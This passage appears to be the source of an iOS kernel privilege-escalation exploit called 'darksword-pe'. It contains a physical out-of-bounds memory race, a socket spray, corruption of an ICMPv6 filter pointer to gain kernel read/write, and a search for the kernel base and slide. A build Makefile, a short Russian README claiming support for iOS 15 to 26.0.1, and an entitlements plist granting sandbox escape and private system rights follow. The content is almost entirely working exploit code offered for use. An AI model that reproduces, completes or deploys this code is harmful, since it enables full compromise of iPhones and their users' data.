uint64_t marker = *(uint64_t *)buffer;

if (marker != randomMarker) {

readRaceSucceeded = true;

successReadCount++;

if (tryIdx > highestSuccessIdx) {

highestSuccessIdx = tryIdx;

}

break;

} else {

usleep(1);

}

}

if (tryIdx == 500) {

break;

}

}

targetObject = 0;

if (!readRaceSucceeded) return 1;

return KERN_SUCCESS;

}

  

kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)

{

kern_return_t kr;

do {

kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);

} while (kr != KERN_SUCCESS);

return kr;

}

  

void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)

{

targetObject = memoryObject;

targetObjectOffset = memoryObjectOffset;

iov.iov_base = (void *)(pcAddress + 0x3f00);

iov.iov_len = offset + size;

  

pwrite(writeFd, buffer, size, 0x3f00 + offset);

for (int tryIdx = 0; tryIdx < 20; tryIdx++) {

raceSync = 1;

preadv(writeFd, &iov, 1, 0x3f00);

while (raceSync == 1);

kern_return_t kr = mach_vm_map(mach_task_self(), 

&pcAddress,

pcSize, 

0, 

VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 

pcObject, 

0, 

0, 

VM_PROT_DEFAULT,

VM_PROT_DEFAULT,

VM_INHERIT_NONE);

if (kr != KERN_SUCCESS) {

printf("[-] mach_vm_map failed!!!\n");

FAILURE(0);

}

}

targetObject = 0;

}

  

void set_target_kaddr(uint64_t where)

{

memset(controlData, 0, EARLY_KRW_LENGTH);

*(uint64_t *)controlData = where;

int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);

if (res != 0) {

printf("[-] setsockopt failed!!!");

FAILURE(0);

}

}

  

void early_kread(uint64_t where, void *read_buf, size_t size)

{

if (size > EARLY_KRW_LENGTH) {

      printf("[!] error: (size > EARLY_KRW_LENGTH)\n");

      FAILURE(0);

    }

    set_target_kaddr(where);

    socklen_t read_data_length = size;

    int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);

    if (res != 0) {

printf("[-] getsockopt failed!!!\n");

FAILURE(0);

    }

}

  

uint64_t early_kread64(uint64_t where)

{

uint64_t value = 0;

early_kread(where, &value, sizeof(value));

return value;

}

  

void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])

{

set_target_kaddr(where);

int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);

if (res != 0) {

printf("[-] setsockopt failed!!!");

FAILURE(0);

}

}

  

void early_kwrite64(uint64_t where, uint64_t what)

{

uint8_t writeBuf[EARLY_KRW_LENGTH];

early_kread(where, writeBuf, EARLY_KRW_LENGTH);

*(uint64_t *)writeBuf = what;

early_kwrite32bytes(where, writeBuf);

}

  

int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)

{

if (doRead) {

physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);

}

  

int searchStartIdx = 0;

bool targetFound = false;

uint64_t pcbStartOffset = 0;

void *found = NULL;

do {

found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));

if (found) {

pcbStartOffset = (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;

if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8)) {

targetFound = true;

break;

}

}

searchStartIdx += 0x400;

} while (found == NULL && searchStartIdx < OOB_SIZE);

  

if (targetFound) {

printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);

uint64_t targetInpGencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x78);

printf("[+] targetInpGencnt: %#llx\n", targetInpGencnt);

if (targetInpGencnt == socketPcbIds.lastObject.unsignedLongLongValue) {

printf("[-] Found last PCB\n");

return -1;

}

bool isOurPcd = false;

int controlSocketIdx = 0;

for (int sockIdx = 0; sockIdx < socketPorts.count; sockIdx++) {

if (socketPcbIds[sockIdx].unsignedLongLongValue == targetInpGencnt) {

isOurPcd = true;

controlSocketIdx = sockIdx;

break;

}

}

if (!isOurPcd) {

printf("[-] Found freed PCB Page!\n");

return -1;

}

if ([targetInpGencntList containsObject:@(targetInpGencnt)]) {

printf("[-] Found old PCB Page!!!!\n");

return -1;

} else {

[targetInpGencntList addObject:@(targetInpGencnt)];

}

uint64_t inpListNextPointer = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x28) - 0x20;

uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);

printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);

printf("[+] icmp6Filter: %#llx\n", icmp6Filter);

rwSocketPcb = inpListNextPointer;

memcpy(writeBuffer, readBuffer, OOB_SIZE);

*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;

*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;

  

printf("[+] Corrupting icmp6filter pointer...\n");

while (true) {

physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);

physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);

uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);

if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {

printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT));

break;

}

}

int sock = fileport_makefd((fileport_t)socketPorts[controlSocketIdx].unsignedLongLongValue);

socklen_t len = GETSOCKOPT_READ_LEN;

int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);

if (res != 0) {

printf("[-] getsockopt failed!!!\n");

FAILURE(0);

}

uint64_t marker = *(uint64_t *)getsockoptReadData;

if (marker != -1) {

printf("[+] Found control_socket at idx: %u\n", controlSocketIdx);

controlSocket = sock;

rwSocket = fileport_makefd((fileport_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue);

return KERN_SUCCESS;

}

else {

printf("[-] Failed to corrupt control_socket at idx: %u\n", controlSocketIdx);

}

}

return -1;

}

  

bool isA18Device = false;

  

void pe_v1(void)

{

uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);

uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);

uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;

uint64_t searchMappingNum = totalSearchMappingSize / searchMappingSize;

  

printf("[i] totalSearchMappingPagesNum: %#llx\n", totalSearchMappingPagesNum);

printf("[i] searchMappingSize: %#llx\n", searchMappingSize);

printf("[i] totalSearchMappingSize: %#llx\n", totalSearchMappingSize);

printf("[i] searchMappingNum: %#llx\n", searchMappingNum);

  

void *readBuffer = calloc(1, OOB_SIZE);

void *writeBuffer = calloc(1, OOB_SIZE);

initialize_physical_read_write(OOB_PAGES_NUM * PAGE_SIZE);

mach_vm_address_t wiredMapping = 0;

mach_vm_size_t wiredMappingSize = 1024ULL * 1024ULL * 1024ULL * 3ULL;

kern_return_t kr = KERN_SUCCESS;

if (isA18Device) {

kr = mach_vm_allocate(mach_task_self(), &wiredMapping, wiredMappingSize, VM_FLAGS_ANYWHERE);

printf("[+] wiredMapping: %#llx\n", wiredMapping);

}

NSMutableArray *targetInpGencntList = [NSMutableArray new];

while (true) {

if (isA18Device) {

surface_mlock(wiredMapping, wiredMappingSize);

for (int s = 0; s < (wiredMappingSize / 0x4000); s++) {

*(uint64_t *)(wiredMapping + s + 0x4000) = 0;

}

}

NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];

for (uint64_t s = 0; s < searchMappingNum; s++) {

mach_vm_address_t searchMappingAddress = 0;

kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);

if (kr != KERN_SUCCESS) {

printf("[-] mach_vm_allocate failed!!!\n");

FAILURE(0);

}

for (int k = 0; k < searchMappingSize; k += PAGE_SIZE) {

*(uint64_t *)(searchMappingAddress + k) = randomMarker;

}

[searchMappings addObject:@(searchMappingAddress)];

}

socketPorts = [NSMutableArray new];

socketPcbIds = [NSMutableArray new];

unsigned socketPortsCount = 0;

#define OPEN_MAX 10240

int maxfiles = OPEN_MAX * 3;

int leeway = 4096 * 2;

for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {

mach_port_t port = spray_socket(socketPorts, socketPcbIds);

if (port == -1) {

printf("[-] Failed to spray sockets: %u\n", socketCount);

break;

} else {

socketPortsCount++;

}

}

uint64_t startPcbId = socketPcbIds.firstObject.unsignedLongLongValue;

uint64_t endPcbId = socketPcbIds.lastObject.unsignedLongLongValue;

printf("[i] socketPortsCount: %u\n", socketPortsCount);

printf("[i] startPcbId: %llu\n", startPcbId);

printf("[i] endPcbId: %llu\n", endPcbId);

bool success = false;

for (uint64_t s = 0; s < searchMappingNum; s++) {

mach_vm_address_t searchMappingAddress = searchMappings[s].unsignedLongLongValue;

printf("[i] looking in search mapping: %llu\n", s);

mach_port_t memoryObject = 0;

mach_vm_size_t memoryObjectSize = searchMappingSize;

kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);

if (kr != KERN_SUCCESS) {

printf("[-] mach_make_memory_entry_64 failed!!!");

FAILURE(0);

}

surface_mlock(searchMappingAddress, searchMappingSize);

mach_vm_offset_t seekingOffset = 0;

while (seekingOffset < searchMappingSize) {

kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);

if (kr == KERN_SUCCESS) {

if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {

success = true;

break;

}

}

seekingOffset += PAGE_SIZE;

}

kr = mach_port_deallocate(mach_task_self(), memoryObject);

if (kr != KERN_SUCCESS) {

printf("[-] mach_port_deallocate failed!!!\n");

FAILURE(0);

}

if (success == true) {

break;

}

}

sockets_release(socketPorts, socketPcbIds);

for (uint64_t s = 0; s < searchMappingNum; s++) {

mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;

[searchMappings removeLastObject];

kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);

}

if (isA18Device) {

surface_munlock(wiredMapping, wiredMappingSize);

}

if (success == true) {

break;

}

}

}

  

void pe_v2(void)

{

// TODO: Implement

}

  

void krw_sockets_leak_forever(void)

{

uint64_t controlSocketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);

uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);

  

if (!controlSocketAddr || !rwSocketAddr) {

printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");

FAILURE(0);

}

  

uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);

uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);

early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);

early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);

  

early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);

}

  

uint64_t kernel_base;

uint64_t kernel_slide;

  

int main(int argc, char* argv[])

{

init_globals();

struct utsname name;

uname(&name);

  

isA18Device = (bool)strstr(name.machine, "iPhone17,");

  

if (isA18Device) {

printf("[+] Running on A18 device\n");

sleep(8);

pe_init();

pe_v2();

}

else {

printf("[+] Running on non-A18 device\n");

pe_init();

pe_v1();

}

  

printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);

printf("[+] successReadCount: %d\n", successReadCount);

  

goSync = 0;

raceSync = 1;

pthread_join(freeThread, NULL);

close(writeFd);

close(readFd); 

  

controlSocketPcb = early_kread64(rwSocketPcb + 0x20);

krw_sockets_leak_forever();

  

uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET); // inpcb->socket

//PRINT_VAR(socketPtr);

uint64_t protoPtr = early_kread64(socketPtr + OFFSET_SO_PROTO); // socket->so_proto

//PRINT_VAR(protoPtr);

uint64_t textPtr = __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT)); // protosw->pr_input

//PRINT_VAR(textPtr);

  

    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;

    while (true) {

//PRINT_VAR(kernel_base);

if (early_kread64(kernel_base) == 0x100000cfeedfacf) {

if (@available(iOS 16.0, *)) {

if (early_kread64(kernel_base + 0x8) == 0xc00000002) {

break;

}

}

else {

break;

}

}

kernel_base -= PAGE_SIZE;

    }

    kernel_slide = kernel_base - 0xfffffff007004000;

  

printf("early_kread64(%#llx) -> %#llx\n", kernel_base, early_kread64(kernel_base));

  

printf("win??\n");

fflush(stdout); sleep(1);

  

return 0;

}

  

  

———————

  

TARGET = darksword-pe

  

CC = clang

  

CFLAGS = -framework Foundation -framework CoreServices -framework Security -framework IOSurface -framework IOKit -I../.include -I./src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -Wno-availability -miphoneos-version-min=15.0 -fobjc-arc

LDFLAGS = 

  

sign: $(TARGET)

@ldid -Sentitlements.plist $<

  

$(TARGET): $(wildcard src/*.m)

$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

  

clean:

@rm -f $(TARGET)

  

  

  

  

  

  

  

——

  

**Эксплойт ядра DarksSword**

  

Повторно реализовано в Objective-C.

Предполагается, что поддержка iOS 15.0 - 26.0.1.

Смесены жестко закодированы для 15.x(?)

  

  

—————

  

  

права

  

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

<plist version="1.0">

<dict>

<key>platform-application</key>

<true/>

<key>proc_info-allow</key>

<true/>

<key>com.apple.private.persona-mgmt</key>

<true/>

<key>com.apple.private.tcc.allow</key>

<array>

<string>kTCCServiceSystemPolicyAllFiles</string>

</array>

<key>com.apple.private.security.storage-exempt.heritable</key>

<true/>

<key>com.apple.private.security.storage.AppBundles</key>

<true/>

<key>com.apple.private.security.no-sandbox</key>

<true/>

<key>com.apple.springboard.CFUserNotification</key>

<true/>

<key>com.apple.springboard.launchapplications</key>

<true/>

<key>com.apple.security.network.client</key>

<true/>

<key>com.apple.private.mobileinstall.allowedSPI</key>

<array>

<string>InstallForLaunchServices</string>

<string>Install</string>

<string>UninstallForLaunchServices</string>

<string>Uninstall</string>

<string>UpdatePlaceholderMetadata</string>

</array>

<key>com.apple.security.exception.iokit-user-client-class</key>

<array>

<string>AGXDevice</string>

<string>AGXDeviceUserClient</string>

<string>AGXSharedUserClient</string>

<string>AGXGLContext</string>

<string>AGXCommandQueue</string>

<string>IOSurfaceRoot</string>

<string>IOSurfaceRootUserClient</string>

<string>AppleJPEGDriverUserClient</string>

        <string>H11ANEInDirectPathClient</string>

</array>

<key>com.apple.developer.kernel.extended-virtual-addressing</key>

<true/>

<key>com.apple.developer.kernel.increased-memory-limit</key>

<true/>

</dict>

</plist>

  

  

————
```


